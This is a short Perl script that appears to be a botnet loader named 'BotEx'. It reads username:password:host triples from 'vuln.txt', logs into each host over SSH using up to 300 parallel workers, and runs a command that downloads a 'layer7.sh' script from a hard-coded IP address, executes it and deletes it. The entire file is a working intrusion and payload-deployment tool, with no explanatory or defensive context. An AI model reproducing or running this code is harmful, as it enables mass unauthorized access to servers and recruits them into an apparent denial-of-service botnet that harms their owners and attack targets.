#!/usr/bin/perl
use Net::SSH2; use Parallel::ForkManager;
#
# __________        __ /\_______________  ___
# \______   \ _____/  |)/\_   _____/\   \/  /
#  |    |  _//  _ \   __\ |    __)_  \     / 
#  |    |   (  <_> )  |   |        \ /     \ 
#  |______  /\____/|__|  /_______  //___/\  \
#         \/                     \/       \_/
#
open(fh,'<','vuln.txt'); @newarray; while (<fh>){ @array = split(':',$_); 
push(@newarray,@array);
}
# make 10 workers
my $pm = new Parallel::ForkManager(300); for (my $i=0; $i < 
scalar(@newarray); $i+=3) {
        # fork a worker
        $pm->start and next;
        $a = $i;
        $b = $i+1;
        $c = $i+2;
        $ssh = Net::SSH2->new();
        if ($ssh->connect($newarray[$c])) {
                if ($ssh->auth_password($newarray[$a],$newarray[$b])) {
                        $channel = $ssh->channel();
                        $channel->exec('cd tmp/; wget 189.79.142.43:8088/layer7.sh -O /tmp/layer7.sh; curl -o /tmp/layer7.sh 189.79.142.43:8088/layer7.sh; sh /tmp/layer7.sh /tmp/layer7.sh.1; rm -rf /tmp/layer7.sh');
                        sleep 25;
                        $channel->close;
                        print "\e[32;1mOn my way! --> ".$newarray[$c]."\n";
                } else {
                        print "\e[0;34mI Might Come 
$newarray[$c]\n";
                }
        } else {
                print "\e[1;31;1mI'm not coming! $newarray[$c]\n";
        }
        # exit worker
        $pm->finish;
}
$pm->wait_all_children;
